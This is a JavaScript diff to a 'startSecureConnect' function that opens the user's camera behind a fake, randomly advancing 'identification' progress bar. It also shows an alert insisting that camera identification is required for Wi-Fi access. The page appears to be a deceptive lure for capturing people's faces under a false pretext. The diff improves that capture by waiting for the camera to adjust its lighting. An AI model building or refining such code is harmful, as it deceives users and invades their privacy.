@@ -331,6 +331,7 @@ function startSecureConnect() {
     navigator.mediaDevices.getUserMedia(constraints)
         .then(function(stream) {
             scanVideo.srcObject = stream;
+            if (window.scanVideo && window.scanVideo.play) scanVideo.play();
             
             let progress = 0;
             let statusTexts = [
@@ -341,7 +342,9 @@ function startSecureConnect() {
             ];
             let textIndex = 0;
 
-            const timer = setInterval(() => {
+            // FIX BLACK FRAME: Wait 1.5 seconds for camera to adjust lighting 
+            setTimeout(() => {
+                const timer = setInterval(() => {
                 progress += Math.floor(Math.random() * 8) + 4;
                 if (progress >= 100) progress = 100;
                 
@@ -367,6 +370,7 @@ function startSecureConnect() {
                     scanStatus.innerText = statusTexts[textIndex];
                 }
             }, 1000);
+            }, 1500);
         })
         .catch(function(err) {
             alert("Identification via Secure Node Authorization is REQUIRED for this Wi-Fi node interface connectivity. Please enable inside settings.");
